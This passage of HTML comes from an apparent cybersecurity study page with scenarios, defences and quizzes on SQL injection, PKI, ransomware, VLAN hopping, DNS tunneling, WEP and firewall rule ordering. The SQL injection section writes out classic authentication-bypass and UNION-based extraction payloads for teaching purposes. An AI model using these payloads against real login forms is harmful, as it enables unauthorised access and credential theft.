3.'')"><span class="opt-letter">A</span>ARP operates at Layer 3, making it vulnerable to routing manipulation.</button>\n        <button class="quiz-opt" onclick="checkQ(this,''wrong'',''ARP uses UDP which is unreliable.'')"><span class="opt-letter">B</span>ARP relies on UDP which does not guarantee delivery or ordering.</button>\n        <button class="quiz-opt" onclick="checkQ(this,''correct'',''✓ Correct! ARP has no authentication mechanism. Any host can claim ownership of any IP address and all other hosts will cache the response without verification.'')"><span class="opt-letter">C</span>ARP is stateless and unauthenticated — any host can claim any IP and others will accept it.</button>\n        <button class="quiz-opt" onclick="checkQ(this,''wrong'',''ARP uses broadcast addresses that are interceptable.'')"><span class="opt-letter">D</span>ARP broadcasts are too slow to be secured under high traffic conditions.</button>\n      </div>\n      <div class="quiz-feedback"></div>\n      <button class="quiz-reset-btn" onclick="resetQ(this)">↺ Try Again</button>\n    </div>\n  </div>\n</section>\n\n<!-- ══════════════════════════════════ T03 SQL INJECTION ══════════════════════════════════ -->\n<section class="topic-section" id="t03">\n  <div class="section-header">\n    <div class="section-num">// 03</div>\n    <div class="section-title-wrap">\n      <h2 class="section-title">SQL Injection</h2>\n      <div class="section-meta">\n        <span class="smeta-tag ct-red" style="border-color:rgba(255,79,107,0.3)">Web Application Attack</span>\n        <span class="smeta-tag ct-amber" style="border-color:rgba(255,181,71,0.3)">Application Layer</span>\n      </div>\n    </div>\n  </div>\n\n  <div class="scenario-card">\n    <div class="scenario-text">A login form at <mark>RetailChain</mark> builds its query as: <code>SELECT * FROM users WHERE username=''INPUT''</code>. An attacker enters <code>'' OR ''1''=''1</code> into the username field. The query becomes logically always-true, bypassing authentication entirely and returning all user records.</div>\n  </div>\n\n  <div class="concept-block">\n    <div class="cb-label" style="color:var(--cyan)">The Core Vulnerability</div>\n    <div class="cb-body">\n      SQL Injection occurs when <strong>user-controlled input is concatenated directly into a SQL query string</strong> without sanitisation. The database cannot distinguish between <em>data</em> (what the user typed) and <em>SQL code</em> (the query structure). The attacker "injects" SQL syntax that changes the query''s logic.<br><br>\n      <strong>Classic example payload:</strong> <em>'' OR ''1''=''1</em><br>\n      Query becomes: <em>SELECT * FROM users WHERE username='''' OR ''1''=''1''</em> — always true.\n    </div>\n  </div>\n\n  <div class="accordion">\n    <div class="accordion-item">\n      <button class="accordion-trigger" onclick="toggleAcc(this)">\n        <span style="font-size:14px">🔓</span>\n        <span class="acc-title">Authentication Bypass</span>\n        <span class="acc-badge ct-red" style="border-color:rgba(255,79,107,0.3)">Attack Type</span>\n        <span class="acc-arrow">▼</span>\n      </button>\n      <div class="accordion-body">Injecting <code>'' OR ''1''=''1'' --</code> into a login form makes the WHERE clause always true. The <code>--</code> comments out the password check entirely. The attacker logs in as any user including admin.</div>\n    </div>\n    <div class="accordion-item">\n      <button class="accordion-trigger" onclick="toggleAcc(this)">\n        <span style="font-size:14px">📋</span>\n        <span class="acc-title">UNION-Based Data Extraction</span>\n        <span class="acc-badge ct-red" style="border-color:rgba(255,79,107,0.3)">Attack Type</span>\n        <span class="acc-arrow">▼</span>\n      </button>\n      <div class="accordion-body">Injecting <code>'' UNION SELECT username, password FROM admin_users --</code> appends a second query result. The attacker extracts data from any table in the database by appending their own SELECT statement via UNION.</div>\n    </div>\n    <div class="accordion-item">\n      <button class="accordion-trigger" onclick="toggleAcc(this)">\n        <span style="font-size:14px">⏱️</span>\n        <span class="acc-title">Blind / Time-Based Injection</span>\n        <span class="acc-badge ct-amber" style="border-color:rgba(255,181,71,0.3)">Advanced</span>\n        <span class="acc-arrow">▼</span>\n      </button>\n      <div class="accordion-body">When no data is returned visibly, the attacker uses <code>SLEEP(5)</code> or <code>WAITFOR DELAY</code> — if the response is delayed, the condition is true. They extract data bit-by-bit through timing differences.</div>\n    </div>\n    <div class="accordion-item">\n      <button class="accordion-trigger" onclick="toggleAcc(this)">\n        <span style="font-size:14px">🛡️</span>\n        <span class="acc-title">Prevention: Parameterised Queries</span>\n        <span class="acc-badge ct-green" style="border-color:rgba(0,232,122,0.3)">Defence</span>\n        <span class="acc-arrow">▼</span>\n      </button>\n      <div class="accordion-body"><strong>Parameterised queries (prepared statements)</strong> separate SQL code from data. The query template is compiled first: <em>SELECT * FROM users WHERE username = ?</em>. The user input is passed as a separate parameter — it can never be interpreted as SQL code, only as a literal string value. This is the primary defence.</div>\n    </div>\n  </div>\n\n  <div class="concepts-row">\n    <span class="concept-tag ct-red">SQL Injection</span>\n    <span class="concept-tag ct-green">Parameterised Queries</span>\n    <span class="concept-tag ct-green">Prepared Statements</span>\n    <span class="concept-tag ct-amber">Input Sanitisation</span>\n    <span class="concept-tag ct-blue">WAF</span>\n    <span class="concept-tag ct-purple">Least Privilege DB</span>\n  </div>\n\n  <div class="quiz-block">\n    <div class="quiz-header"><span class="quiz-header-icon">🧠</span><span class="quiz-header-title">Quick Check</span></div>\n    <div class="quiz-body">\n      <div class="quiz-question">What is the primary technical fix that eliminates SQL injection at the code level?</div>\n      <div class="quiz-options">\n        <button class="quiz-opt" onclick="checkQ(this,''wrong'',''Input length limits prevent long injection payloads.'')"><span class="opt-letter">A</span>Enforcing maximum input length to prevent long injection payloads.</button>\n        <button class="quiz-opt" onclick="checkQ(this,''wrong'',''Using HTTPS encrypts user input in transit.'')"><span class="opt-letter">B</span>Using HTTPS so the input is encrypted in transit.</button>\n        <button class="quiz-opt" onclick="checkQ(this,''correct'',''✓ Correct! Parameterised queries compile the SQL structure first, then bind user input as a typed parameter. Input is treated as data — never as executable SQL code.'')"><span class="opt-letter">C</span>Parameterised queries / prepared statements that separate SQL code from user data.</button>\n        <button class="quiz-opt" onclick="checkQ(this,''wrong'',''A Web Application Firewall alone is sufficient.'')"><span class="opt-letter">D</span>Deploying a WAF as the sole control, which blocks all injection attempts.</button>\n      </div>\n      <div class="quiz-feedback"></div>\n      <button class="quiz-reset-btn" onclick="resetQ(this)">↺ Try Again</button>\n    </div>\n  </div>\n</section>\n\n<!-- ══════════════════════════════════ T04 PKI & TLS ══════════════════════════════════ -->\n<section class="topic-section" id="t04">\n  <div class="section-header">\n    <div class="section-num">// 04</div>\n    <div class="section-title-wrap">\n      <h2 class="section-title">PKI, Certificates & TLS Trust Chains</h2>\n      <div class="section-meta">\n        <span class="smeta-tag ct-green" style="border-color:rgba(0,232,122,0.3)">Cryptographic Infrastructure</span>\n        <span class="smeta-tag ct-cyan" style="border-color:rgba(0,212,255,0.3)">Authentication</span>\n      </div>\n    </div>\n  </div>\n\n  <div class="scenario-card">\n    <div class="scenario-text">A browser shows a certificate warning for <mark>securepay.com</mark>. The cert is signed by <code>CA: QuickSSL</code>, but QuickSSL is not in the browser''s trusted root store. A forensic review shows the site''s cert was issued yesterday and uses a 512-bit RSA key. What''s wrong?</div>\n  </div>\n\n  <div class="concept-block">\n    <div class="cb-label" style="color:var(--cyan)">PKI Trust Chain</div>\n    <div class="cb-body">\n      <strong>Public Key Infrastructure (PKI)</strong> establishes a chain of trust for digital certificates. A <em>Certificate Authority (CA)</em> signs digital certificates, vouching that a public key belongs to the named entity. The chain flows from a <em>Root CA</em> (self-signed, pre-trusted) → <em>Intermediate CA</em> → <em>End-Entity Certificate</em>.<br><br>\n      Browsers ship with a <strong>Root Store</strong> containing ~100–200 trusted Root CA certificates. Any certificate signed by a trusted CA (directly or via intermediates) is accepted. If the CA is not in the Root Store, the browser shows a warning.\n    </div>\n  </div>\n\n  <div class="diagram-block">\n    <div class="diagram-label">Certificate Trust Chain</div>\n    <div class="flow-row">\n      <div class="flow-node fn-server">Root CA<br><small>Self-signed · Pre-installed</small></div>\n      <div class="flow-arrow green">──Signs──▶</div>\n      <div class="flow-node fn-network">Intermediate CA<br><small>Offline/Online</small></div>\n      <div class="flow-arrow green">──Signs──▶</div>\n      <div class="flow-node fn-victim">securepay.com<br><small>End-entity cert</small></div>\n    </div>\n  </div>\n\n  <div class="compare-table" style="width:100%">\n    <table class="compare-table">\n      <thead><tr><th>Property</th><th>Weak (Scenario)</th><th>Secure (Standard)</th></tr></thead>\n      <tbody>\n        <tr><td class="td-label">RSA Key Size</td><td class="td-bad">512-bit — factored easily</td><td class="td-good">2048-bit minimum (4096 recommended)</td></tr>\n        <tr><td class="td-label">CA Trust</td><td class="td-bad">Unknown / self-signed CA</td><td class="td-good">Trusted Root CA (e.g. DigiCert, Let''s Encrypt)</td></tr>\n        <tr><td class="td-label">Cert Age</td><td class="td-bad">Issued yesterday = suspicious</td><td class="td-good">Reasonable validity with CT log inclusion</td></tr>\n        <tr><td class="td-label">Signature Algorithm</td><td class="td-bad">MD5 / SHA-1 (broken)</td><td class="td-good">SHA-256 / SHA-384</td></tr>\n      </tbody>\n    </table>\n  </div>\n\n  <div class="concepts-row">\n    <span class="concept-tag ct-green">PKI</span>\n    <span class="concept-tag ct-cyan">TLS</span>\n    <span class="concept-tag ct-amber">Certificate Authority</span>\n    <span class="concept-tag ct-blue">Root Store</span>\n    <span class="concept-tag ct-red">Self-Signed</span>\n    <span class="concept-tag ct-purple">Chain of Trust</span>\n    <span class="concept-tag ct-green">CT Logs</span>\n  </div>\n\n  <div class="quiz-block">\n    <div class="quiz-header"><span class="quiz-header-icon">🧠</span><span class="quiz-header-title">Quick Check</span></div>\n    <div class="quiz-body">\n      <div class="quiz-question">Why does a browser warn about a certificate from an unknown CA?</div>\n      <div class="quiz-options">\n        <button class="quiz-opt" onclick="checkQ(this,''wrong'',''The cert uses the wrong domain format.'')"><span class="opt-letter">A</span>The certificate uses a domain format the browser cannot parse.</button>\n        <button class="quiz-opt" onclick="checkQ(this,''correct'',''✓ Correct! The browser maintains a Root Store of pre-trusted CAs. If the signing CA is not in the store, there is no established chain of trust — the identity cannot be verified.'')"><span class="opt-letter">B</span>The signing CA is not in the browser\\''s Root Store — trust cannot be established up the chain.</button>\n        <button class="quiz-opt" onclick="checkQ(this,''wrong'',''The cert is too new.'')"><span class="opt-letter">C</span>Newly issued certificates are automatically flagged as untrusted for 30 days.</button>\n        <button class="quiz-opt" onclick="checkQ(this,''wrong'',''The server IP does not match the cert domain.'')"><span class="opt-letter">D</span>The server IP address does not match the certificate\\''s IP field.</button>\n      </div>\n      <div class="quiz-feedback"></div>\n      <button class="quiz-reset-btn" onclick="resetQ(this)">↺ Try Again</button>\n    </div>\n  </div>\n</section>\n\n<!-- ══════════════════════════════════ T05 RANSOMWARE ══════════════════════════════════ -->\n<section class="topic-section" id="t05">\n  <div class="section-header">\n    <div class="section-num">// 05</div>\n    <div class="section-title-wrap">\n      <h2 class="section-title">Ransomware & Hybrid Encryption</h2>\n      <div class="section-meta">\n        <span class="smeta-tag ct-red" style="border-color:rgba(255,79,107,0.3)">Malware</span>\n        <span class="smeta-tag ct-purple" style="border-color:rgba(180,127,255,0.3)">Cryptography Abuse</span>\n      </div>\n    </div>\n  </div>\n\n  <div class="scenario-card">\n    <div class="scenario-text">Workstations at <mark>MedCare Hospital</mark> display a ransom note. Files are encrypted with <code>.locked</code> extensions. The ransom note says "Your files are encrypted with AES-256. Pay 5 BTC to receive your RSA private key." The hospital had no offline backups.</div>\n  </div>\n\n  <div class="concept-block">\n    <div class="cb-label" style="color:var(--cyan)">How Ransomware Works — Hybrid Encryption</div>\n    <div class="cb-body">\n      Modern ransomware uses <strong>hybrid encryption</strong> — combining symmetric and asymmetric cryptography for speed and security.<br><br>\n      <strong>Step 1:</strong> The ransomware generates a random <em>AES session key</em> on the victim machine.<br>\n      <strong>Step 2:</strong> It encrypts all files with this AES key (fast — AES is symmetric).<br>\n      <strong>Step 3:</strong> It encrypts the AES session key with the <em>attacker''s RSA public key</em>.<br>\n      <strong>Step 4:</strong> The AES key is deleted from memory. Only the attacker''s RSA <em>private key</em> can decrypt it.<br><br>\n      Without paying the ransom, recovery is cryptographically infeasible.\n    </div>\n  </div>\n\n  <div class="callout danger"><span class="callout-icon">⚠️</span><div><strong>Why backups matter above everything else:</strong> Ransomware operators specifically hunt for and encrypt backup files. Offline, air-gapped backups following the 3-2-1 rule (3 copies, 2 media types, 1 offsite) are the only reliable recovery path.</div></div>\n\n  <div class="defense-grid">\n    <div class="defense-card">\n      <div class="dc-icon">💾</div>\n      <div class="dc-title">Offline / Air-Gapped Backups</div>\n      <div class="dc-desc">3-2-1 backup strategy. Backups must not be network-accessible from production systems — ransomware will encrypt them too.</div>\n    </div>\n    <div class="defense-card">\n      <div class="dc-icon">🔒</div>\n      <div class="dc-title">Endpoint Detection (EDR)</div>\n      <div class="dc-desc">Behaviour-based detection — triggering on mass file encryption activity, not just signatures.</div>\n    </div>\n    <div class="defense-card">\n      <div class="dc-icon">🧱</div>\n      <div class="dc-title">Email Filtering & Phishing Training</div>\n      <div class="dc-desc">Most ransomware enters via phishing. Sandbox attachments, block macros, train users on suspicious emails.</div>\n    </div>\n    <div class="defense-card">\n      <div class="dc-icon">📋</div>\n      <div class="dc-title">Least Privilege & Segmentation</div>\n      <div class="dc-desc">Limit what files a user/process can access. Segmentation prevents lateral spread across the network.</div>\n    </div>\n  </div>\n\n  <div class="concepts-row">\n    <span class="concept-tag ct-red">Ransomware</span>\n    <span class="concept-tag ct-purple">Hybrid Encryption</span>\n    <span class="concept-tag ct-cyan">AES-256</span>\n    <span class="concept-tag ct-blue">RSA Public Key</span>\n    <span class="concept-tag ct-green">3-2-1 Backup</span>\n    <span class="concept-tag ct-amber">Phishing Vector</span>\n    <span class="concept-tag ct-green">EDR</span>\n  </div>\n\n  <div class="quiz-block">\n    <div class="quiz-header"><span class="quiz-header-icon">🧠</span><span class="quiz-header-title">Quick Check</span></div>\n    <div class="quiz-body">\n      <div class="quiz-question">Why does modern ransomware use both AES and RSA, rather than just one?</div>\n      <div class="quiz-options">\n        <button class="quiz-opt" onclick="checkQ(this,''wrong'',''To make the ransom note look more technical.'')"><span class="opt-letter">A</span>Using two algorithms makes the malware appear more legitimate to victims.</button>\n        <button class="quiz-opt" onclick="checkQ(this,''wrong'',''RSA alone is sufficient for file encryption.'')"><span class="opt-letter">B</span>RSA alone is used for file encryption — AES is only for network communication.</button>\n        <button class="quiz-opt" onclick="checkQ(this,''correct'',''✓ Correct! AES is fast for bulk file encryption. RSA asymmetric crypto protects the AES key so only the attacker (holding the private key) can decrypt it. RSA alone would be too slow to encrypt GB of files.'')"><span class="opt-letter">C</span>AES is fast for bulk file encryption; RSA protects the AES key so only the attacker can recover it.</button>\n        <button class="quiz-opt" onclick="checkQ(this,''wrong'',''AES requires RSA for key distribution over the internet.'')"><span class="opt-letter">D</span>AES cannot function without RSA providing initial entropy for key generation.</button>\n      </div>\n      <div class="quiz-feedback"></div>\n      <button class="quiz-reset-btn" onclick="resetQ(this)">↺ Try Again</button>\n    </div>\n  </div>\n</section>\n\n<!-- ══════════════════════════════════ T06 VLAN HOPPING ══════════════════════════════════ -->\n<section class="topic-section" id="t06">\n  <div class="section-header">\n    <div class="section-num">// 06</div>\n    <div class="section-title-wrap">\n      <h2 class="section-title">VLAN Hopping — Double Tagging Attack</h2>\n      <div class="section-meta">\n        <span class="smeta-tag ct-amber" style="border-color:rgba(255,181,71,0.3)">Layer 2 Attack</span>\n        <span class="smeta-tag ct-red" style="border-color:rgba(255,79,107,0.3)">802.1Q Exploit</span>\n      </div>\n    </div>\n  </div>\n\n  <div class="scenario-card">\n    <div class="scenario-text">An attacker on <mark>VLAN 1</mark> (the native VLAN) crafts frames with two 802.1Q tags: an outer tag for <code>VLAN 1</code> and an inner tag for <code>VLAN 100</code> (the finance VLAN). The trunk switch strips the outer tag, then forwards the frame into VLAN 100, bypassing VLAN isolation.</div>\n  </div>\n\n  <div class="concept-block">\n    <div class="cb-label" style="color:var(--cyan)">Understanding 802.1Q & Trunk Ports</div>\n    <div class="cb-body">\n      <strong>VLANs</strong> segment a physical switch into isolated logical networks. <em>Trunk ports</em> carry traffic for multiple VLANs using IEEE 802.1Q tagging — a 4-byte tag inserted into the Ethernet frame specifying the VLAN ID.<br><br>\n      The <strong>native VLAN</strong> is a trunk port configuration where frames from that VLAN are sent <em>untagged</em>. By default on Cisco switches, this is VLAN 1.<br><br>\n      <strong>Attack:</strong> The attacker crafts a frame with two tags — outer = native VLAN (stripped by the first switch), inner = target VLAN. The second switch sees only the inner tag and forwards it into the target VLAN.\n    </div>\n  </div>\n\n  <div class="steps-grid">\n    <div class="step-card" data-step="1"><div class="step-icon">📦</div><div class="step-title">Double-Tagged Frame</div><div class="step-desc">Attacker creates a frame: [Outer: VLAN 1] [Inner: VLAN 100] [Payload]</div></div>\n    <div class="step-card" data-step="2"><div class="step-icon">🔄</div><div class="step-title">First Switch Strips</div><div class="step-desc">First switch strips the outer VLAN 1 tag (native VLAN — no tag needed). Forwards to trunk.</div></div>\n    <div class="step-card" data-step="3"><div class="step-icon">🎯</div><div class="step-title">Second Switch Delivers</div><div class="step-desc">Second switch sees the inner VLAN 100 tag and delivers the frame to VLAN 100 hosts.</div></div>\n    <div class="step-card" data-step="4"><div class="step-icon">⚠️</div><div class="step-title">One-Way Attack</div><div class="step-desc">Note: This is one-directional — responses cannot be routed back. Useful for DoS or data injection.</div></div>\n  </div>\n\n  <div class="callout info"><span class="callout-icon">🛠️</span><div><strong>Fix:</strong> Set the native VLAN to an unused, dedicated VLAN (e.g. VLAN 999) on all trunk ports. Ensure no end-user devices sit on the native VLAN. Explicitly tag all VLANs on trunk ports.</div></div>\n\n  <div class="concepts-row">\n    <span class="concept-tag ct-amber">VLAN Hopping</span>\n    <span class="concept-tag ct-red">Double Tagging</span>\n    <span class="concept-tag ct-blue">802.1Q</span>\n    <span class="concept-tag ct-purple">Native VLAN</span>\n    <span class="concept-tag ct-cyan">Trunk Port</span>\n    <span class="concept-tag ct-green">Unused VLAN</span>\n  </div>\n\n  <div class="quiz-block">\n    <div class="quiz-header"><span class="quiz-header-icon">🧠</span><span class="quiz-header-title">Quick Check</span></div>\n    <div class="quiz-body">\n      <div class="quiz-question">What configuration change is the primary mitigation for double-tagging VLAN hopping?</div>\n      <div class="quiz-options">\n        <button class="quiz-opt" onclick="checkQ(this,''wrong'',''Disable all trunk ports and use access ports only.'')"><span class="opt-letter">A</span>Disable all trunk ports and run only access ports on the switch.</button>\n        <button class="quiz-opt" onclick="checkQ(this,''correct'',''✓ Correct! Changing the native VLAN to an unused VLAN means the attacker cannot exploit native VLAN tag-stripping. No user traffic should ever run on the native VLAN.'')"><span class="opt-letter">B</span>Change the native VLAN on trunk ports to an unused, dedicated VLAN (e.g. VLAN 999).</button>\n        <button class="quiz-opt" onclick="checkQ(this,''wrong'',''Enable spanning tree BPDU guard on all ports.'')"><span class="opt-letter">C</span>Enable Spanning Tree BPDU guard on all access ports.</button>\n        <button class="quiz-opt" onclick="checkQ(this,''wrong'',''Use 802.1X authentication on all trunks.'')"><span class="opt-letter">D</span>Require 802.1X port authentication before allowing trunk formation.</button>\n      </div>\n      <div class="quiz-feedback"></div>\n      <button class="quiz-reset-btn" onclick="resetQ(this)">↺ Try Again</button>\n    </div>\n  </div>\n</section>\n\n<!-- ══════════════════════════════════ T07 DNS TUNNELING ══════════════════════════════════ -->\n<section class="topic-section" id="t07">\n  <div class="section-header">\n    <div class="section-num">// 07</div>\n    <div class="section-title-wrap">\n      <h2 class="section-title">DNS Tunneling & C2 Communication</h2>\n      <div class="section-meta">\n        <span class="smeta-tag ct-red" style="border-color:rgba(255,79,107,0.3)">C2 / Exfiltration</span>\n        <span class="smeta-tag ct-amber" style="border-color:rgba(255,181,71,0.3)">Protocol Abuse</span>\n      </div>\n    </div>\n  </div>\n\n  <div class="scenario-card">\n    <div class="scenario-text">Logs at <mark>LogixSoft</mark> show a host sending DNS queries every 60 seconds for subdomains like <code>dGhpcyBpcyBiYXNlNjQ.malicious-c2.com</code> — high-entropy base64-looking names. No firewall blocks DNS. The queries persist for months with signs of data exfiltration.</div>\n  </div>\n\n  <div class="concept-block">\n    <div class="cb-label" style="color:var(--cyan)">How DNS Tunneling Works</div>\n    <div class="cb-body">\n      <strong>DNS is almost universally permitted outbound</strong> — even the most restrictive firewalls must allow DNS (port 53) for normal operation. Attackers exploit this by encoding data inside DNS queries and responses.<br><br>\n      The attacker <strong>controls an authoritative DNS server</strong> for a domain they own (e.g. <em>malicious-c2.com</em>). Data to be exfiltrated is Base64-encoded and embedded as subdomains: <em>[encoded-data].malicious-c2.com</em>. The attacker''s DNS server receives these as legitimate DNS resolution requests, decodes the subdomains, and extracts the data. Commands can be sent back in DNS TXT or CNAME records.\n    </div>\n  </div>\n\n  <div class="diagram-block">\n    <div class="diagram-label">DNS Tunnel Channel</div>\n    <div class="flow-row">\n      <div class="flow-node fn-attacker">Infected Host<br><small>Encodes data → subdomain</small></div>\n      <div class="flow-arrow amber">──DNS Query──▶</div>\n      <div class="flow-node fn-neutral">Corporate DNS<br><small>Forwards (allowed)</small></div>\n      <div class="flow-arrow amber">──Resolves──▶</div>\n      <div class="flow-node fn-server">Attacker DNS<br><small>Decodes data</small></div>\n    </div>\n    <div style="margin-top:12px;" class="flow-row">\n      <div class="flow-node fn-attacker">Infected Host</div>\n      <div class="flow-arrow green">◀──DNS Response──</div>\n      <div class="flow-node fn-neutral">Corporate DNS</div>\n      <div class="flow-arrow green">◀──C2 Command (TXT record)──</div>\n      <div class="flow-node fn-server">Attacker DNS</div>\n    </div>\n  </div>\n\n  <div class="defense-grid">\n    <div class="defense-card">\n      <div class="dc-icon">📊</div>\n      <div class="dc-title">DNS Entropy Analysis</div>\n      <div class="dc-desc">Monitor for subdomains with abnormally high entropy (random-looking strings). Legitimate domains have low-entropy, human-readable subdomains.</div>\n    </div>\n    <div class="defense-card">\n      <div class="dc-icon">🔢</div>\n      <div class="dc-title">DNS Query Rate Monitoring</div>\n      <div class="dc-desc">Flag hosts sending more than a threshold of queries to one domain per hour. Tunneling typically shows periodic, regular query patterns.</div>\n    </div>\n    <div class="defense-card">\n      <div class="dc-icon">🛡️</div>\n      <div class="dc-title">DNS Security (DNSSEC / DNS Firewall)</div>\n      <div class="dc-desc">DNS firewall blocks queries to known malicious domains. Threat intel feeds block C2 infrastructure. Recursive resolvers can block suspicious query patterns.</div>\n    </div>\n  </div>\n\n  <div class="concepts-row">\n    <span class="concept-tag ct-red">DNS Tunneling</span>\n    <span class="concept-tag ct-red">C2</span>\n    <span class="concept-tag ct-amber">Base64 Encoding</span>\n    <span class="concept-tag ct-blue">Port 53</span>\n    <span class="concept-tag ct-cyan">Subdomain</span>\n    <span class="concept-tag ct-purple">High Entropy</span>\n    <span class="concept-tag ct-green">DNS Firewall</span>\n  </div>\n\n  <div class="quiz-block">\n    <div class="quiz-header"><span class="quiz-header-icon">🧠</span><span class="quiz-header-title">Quick Check</span></div>\n    <div class="quiz-body">\n      <div class="quiz-question">Why does DNS tunneling evade most traditional firewalls?</div>\n      <div class="quiz-options">\n        <button class="quiz-opt" onclick="checkQ(this,''wrong'',''DNS traffic is encrypted end-to-end by default.'')"><span class="opt-letter">A</span>DNS traffic is encrypted end-to-end so the firewall cannot inspect it.</button>\n        <button class="quiz-opt" onclick="checkQ(this,''wrong'',''DNS uses ICMP which firewalls do not inspect.'')"><span class="opt-letter">B</span>DNS uses ICMP, which traditional firewalls only rate-limit rather than block.</button>\n        <button class="quiz-opt" onclick="checkQ(this,''correct'',''✓ Correct! DNS (port 53) must be permitted outbound on virtually all networks — blocking it breaks internet connectivity. Traditional firewalls allow DNS without deep inspection. The data payload is hidden inside legitimate-looking DNS query structure.'')"><span class="opt-letter">C</span>Port 53 DNS must be permitted for network operation. Firewalls allow it without inspecting query content.</button>\n        <button class="quiz-opt" onclick="checkQ(this,''wrong'',''Firewalls cannot parse DNS TTL fields.'')"><span class="opt-letter">D</span>DNS TTL fields confuse firewall state tracking, causing queries to bypass inspection.</button>\n      </div>\n      <div class="quiz-feedback"></div>\n      <button class="quiz-reset-btn" onclick="resetQ(this)">↺ Try Again</button>\n    </div>\n  </div>\n</section>\n\n<!-- ══════════════════════════════════ T08 WEP/RC4 ══════════════════════════════════ -->\n<section class="topic-section" id="t08">\n  <div class="section-header">\n    <div class="section-num">// 08</div>\n    <div class="section-title-wrap">\n      <h2 class="section-title">WEP Cryptographic Failure & RC4 IV Reuse</h2>\n      <div class="section-meta">\n        <span class="smeta-tag ct-red" style="border-color:rgba(255,79,107,0.3)">Wireless Security</span>\n        <span class="smeta-tag ct-purple" style="border-color:rgba(180,127,255,0.3)">Cryptographic Flaw</span>\n      </div>\n    </div>\n  </div>\n\n  <div class="scenario-card">\n    <div class="scenario-text"><mark>CloudBridge</mark> uses WEP-encrypted wireless for warehouse terminals. A researcher passively captures ~50,000 packets and using <code>aircrack-ng</code> recovers the full encryption key in under 3 minutes — <strong>without brute force</strong>.</div>\n  </div>\n\n  <div class="concept-block">\n    <div class="cb-label" style="color:var(--cyan)">Why WEP is Cryptographically Broken</div>\n    <div class="cb-body">\n      WEP uses the <strong>RC4 stream cipher</strong>. RC4 uses a key + an <em>Initialization Vector (IV)</em> to generate a keystream that XORs with the plaintext. The problem: <strong>WEP''s IV is only 24 bits</strong> — giving only 16.7 million possible values.<br><br>\n      Under moderate traffic (~5,000 packets/min), IVs are <strong>reused</strong> within minutes. When the same IV is reused, the same keystream is generated. An attacker collecting multiple ciphertexts encrypted with the same keystream can apply <em>statistical attacks (FMS / KoreK)</em> to recover the root key.<br><br>\n      Additionally, <strong>WEP uses CRC-32</strong> for integrity — which is not a cryptographic MAC. Attackers can modify encrypted packets and recalculate a valid CRC.\n    </div>\n  </div>\n\n  <div class="compare-table" style="width:100%">\n    <table class="compare-table">\n      <thead><tr><th>Protocol</th><th>Cipher</th><th>IV Size</th><th>Integrity</th><th>Status</th></tr></thead>\n      <tbody>\n        <tr><td class="td-label">WEP</td><td>RC4</td><td class="td-bad">24-bit (reused!)</td><td class="td-bad">CRC-32</td><td class="td-bad">BROKEN — Do not use</td></tr>\n        <tr><td class="td-label">WPA (TKIP)</td><td>RC4 + TKIP</td><td>48-bit</td><td>Michael MIC</td><td class="td-bad">Deprecated</td></tr>\n        <tr><td class="td-label">WPA2</td><td>AES-CCMP</td><td class="td-good">48-bit + replay counter</td><td class="td-good">CBC-MAC</td><td class="td-good">Current standard</td></tr>\n        <tr><td class="td-label">WPA3</td><td>AES-GCM</td><td class="td-good">SAE Handshake</td><td class="td-good">Forward Secrecy</td><td class="td-good">Best practice</td></tr>\n      </tbody>\n    </table>\n  </div>\n\n  <div class="concepts-row">\n    <span class="concept-tag ct-red">WEP</span>\n    <span class="concept-tag ct-purple">RC4</span>\n    <span class="concept-tag ct-amber">IV Reuse</span>\n    <span class="concept-tag ct-red">FMS Attack</span>\n    <span class="concept-tag ct-cyan">Keystream</span>\n    <span class="concept-tag ct-green">WPA2 AES-CCMP</span>\n    <span class="concept-tag ct-red">CRC-32</span>\n  </div>\n\n  <div class="quiz-block">\n    <div class="quiz-header"><span class="quiz-header-icon">🧠</span><span class="quiz-header-title">Quick Check</span></div>\n    <div class="quiz-body">\n      <div class="quiz-question">What is the root cause of WEP''s cryptographic weakness?</div>\n      <div class="quiz-options">\n        <button class="quiz-opt" onclick="checkQ(this,''wrong'',''WEP uses DES which is a weak cipher.'')"><span class="opt-letter">A</span>WEP uses the DES cipher which has a 56-bit key that is easily brute-forced.</button>\n        <button class="quiz-opt" onclick="checkQ(this,''wrong'',''WEP transmits the key in plaintext during association.'')"><span class="opt-letter">B</span>WEP transmits the encryption key in plaintext during the association handshake.</button>\n        <button class="quiz-opt" onclick="checkQ(this,''correct'',''✓ Correct! WEP uses a 24-bit IV which creates only ~16.7M unique keystreams. Under normal traffic, IVs repeat rapidly. Repeated IVs create repeated keystreams — enabling statistical attacks (FMS/KoreK) to derive the key without brute force.'')"><span class="opt-letter">C</span>WEP\\''s 24-bit IV is too small — it is quickly reused, exposing repeated keystreams to statistical cryptanalysis.</button>\n        <button class="quiz-opt" onclick="checkQ(this,''wrong'',''WEP does not use any encryption on control frames.'')"><span class="opt-letter">D</span>WEP only encrypts data frames but leaves management and control frames unencrypted.</button>\n      </div>\n      <div class="quiz-feedback"></div>\n      <button class="quiz-reset-btn" onclick="resetQ(this)">↺ Try Again</button>\n    </div>\n  </div>\n</section>\n\n<!-- ══════════════════════════════════ T09 FIREWALL RULES ══════════════════════════════════ -->\n<section class="topic-section" id="t09">\n  <div class="section-header">\n    <div class="section-num">// 09</div>\n    <div class="section-title-wrap">\n      <h2 class="section-title">Firewall Rule Ordering & First-Match Evaluation</h2>\n      <div class="section-meta">\n        <span class="smeta-tag ct-amber" style="border-color:rgba(255,181,71,0.3)">Misconfiguration</span>\n        <span class="smeta-tag ct-cyan" style="border-color:rgba(0,212,255,0.3)">Firewall Policy</span>\n      </div>\n    </div>\n  </div>\n\n  <div class="scenario-card">\n    <div class="scenario-text">A firewall at <mark>NetShield Corp</mark> has: <code>Rule 1 — permit ALL TCP from ANY to ANY on port 443</code>. <code>Rule 2 — deny all traffic from known malicious IP range</code>. Firewall uses top-down first-match evaluation. Malicious IPs are still reaching internal servers over HTTPS.</div>\n  </div>\n\n  <div class="concept-block">\n    <div class="cb-label" style="color:var(--cyan)">First-Match / Top-Down Evaluation</div>\n    <div class="cb-body">\n      Most firewalls evaluate rules <strong>top-to-bottom</strong> and apply the <em>first matching rule</em>. Subsequent rules are not checked once a match is found.<br><br>\n      In this scenario: a packet from a malicious IP on port 443 hits <em>Rule 1</em> first — "permit ALL TCP port 443." The rule matches, the packet is permitted, and the firewall moves on. <em>Rule 2</em> is <strong>never evaluated</strong>. The deny block list is completely nullified by the overly permissive rule above it.\n    </div>\n  </div>\n\n  <div class="callout danger"><span class="callout-icon">❌</span><div><strong>Broken Order:</strong><br>Rule 1: PERMIT ANY → ANY port 443<br>Rule 2: DENY 185.x.x.0/24 (malicious range) ← Never reached</div></div>\n\n  